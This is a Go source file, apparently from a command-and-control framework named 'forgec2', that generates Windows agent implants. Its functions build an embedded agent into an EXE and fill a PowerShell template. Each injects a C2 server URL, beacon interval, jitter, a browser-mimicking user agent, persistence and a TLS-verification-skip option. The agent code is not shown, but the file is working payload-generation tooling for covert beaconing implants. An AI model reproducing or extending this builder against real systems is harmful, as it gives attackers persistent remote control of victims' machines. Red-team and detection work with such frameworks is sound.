package payload

import (
	"bytes"
	"embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
)

//go:embed agent/* powershell_template.ps1
var payloadFS embed.FS

// AgentConfig holds parameters injected into the generated agent (EXE or PS1).
// All agents must be produced exclusively through the Generate page.
type AgentConfig struct {
	C2URL           string
	Protocol        string // http or tcp
	Interval        int
	Jitter          int
	UserAgent       string
	Persist         bool
	SkipTLSVerify   bool
	Filename        string // for output name
}

// GenerateWindowsEXE builds the Windows agent EXE (only via Generate page) using the embedded agent source + ldflags injection.
func GenerateWindowsEXE(cfg AgentConfig, outputDir string) (string, error) {
	if cfg.C2URL == "" {
		cfg.C2URL = "http://127.0.0.1:8080"
	}
	if cfg.Interval == 0 {
		cfg.Interval = 10
	}
	if cfg.Jitter == 0 {
		cfg.Jitter = 20
	}
	if cfg.UserAgent == "" {
		cfg.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}
	if !cfg.SkipTLSVerify {
		// respect explicit false from UI
	} else {
		cfg.SkipTLSVerify = true
	}

	// Create temp build dir
	tmpDir, err := os.MkdirTemp("", "forgec2-agent-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	// Write agent source from embed (generated EXE only comes from Generate flow)
	agentSrc, err := payloadFS.ReadFile("agent/agent.go")
	if err != nil {
		return "", fmt.Errorf("failed to read embedded agent source: %w", err)
	}

	agentSrcPath := filepath.Join(tmpDir, "agent.go")
	if err := os.WriteFile(agentSrcPath, agentSrc, 0644); err != nil {
		return "", err
	}

	// Minimal go.mod for agent (stdlib only)
	goMod := `module agent

go 1.22
`

	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	// ldflags to inject vars - escape special characters for shell
	userAgent := cfg.UserAgent
	persist := "false"
	if cfg.Persist {
		persist = "true"
	}

	ldflags := "-X main.C2URL=" + cfg.C2URL +
		" -X main.Interval=" + fmt.Sprintf("%d", cfg.Interval) +
		" -X main.Jitter=" + fmt.Sprintf("%d", cfg.Jitter) +
		" -X main.UserAgent=" + userAgent +
		" -X main.Persist=" + persist +
		" -X main.SkipTLSVerify=" + fmt.Sprintf("%t", cfg.SkipTLSVerify)

	// Output filename
	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.exe"
	}
	outPath := filepath.Join(outputDir, outName)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return "", err
	}

	// Build command - use explicit GOOS/GOARCH
	cmd := exec.Command("go", "build",
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
	)
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)

	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("go build failed: %w\n%s", err, stderr.String())
	}

	return outPath, nil
}

// GeneratePowerShellSource returns the complete PowerShell agent source code
// after executing the external template. This is the single source of truth.
func GeneratePowerShellSource(cfg AgentConfig) (string, error) {
	if cfg.C2URL == "" {
		cfg.C2URL = "http://127.0.0.1:8080"
	}
	if cfg.Interval == 0 {
		cfg.Interval = 10
	}
	if cfg.Jitter == 0 {
		cfg.Jitter = 20
	}
	if cfg.UserAgent == "" {
		cfg.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
	}
	if cfg.Protocol == "" {
		cfg.Protocol = "http"
	}
	if !cfg.SkipTLSVerify {
		// respect explicit false
	} else {
		cfg.SkipTLSVerify = true
	}

	tmplContent, err := payloadFS.ReadFile("powershell_template.ps1")
	if err != nil {
		return "", fmt.Errorf("powershell template not found in embed: %w", err)
	}

	tmpl, err := template.New("ps1").Parse(string(tmplContent))
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, cfg); err != nil {
		return "", err
	}
	return buf.String(), nil
}

// GeneratePowerShell creates a .ps1 agent file on disk (only via Generate page).
// Internally uses the full template.
func GeneratePowerShell(cfg AgentConfig, outputDir string) (string, error) {
	ps1Code, err := GeneratePowerShellSource(cfg)
	if err != nil {
		return "", err
	}

	outName := cfg.Filename
	if outName == "" {
		outName = "forgec2_agent.ps1"
	}
	outPath := filepath.Join(outputDir, outName)
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return "", err
	}
	if err := os.WriteFile(outPath, []byte(ps1Code), 0644); err != nil {
		return "", err
	}
	return outPath, nil
}

// Note: Agents are ONLY produced via the Generate page (EXE + PS1).
// The PS1 template lives in powershell_template.ps1 as the canonical implementation.
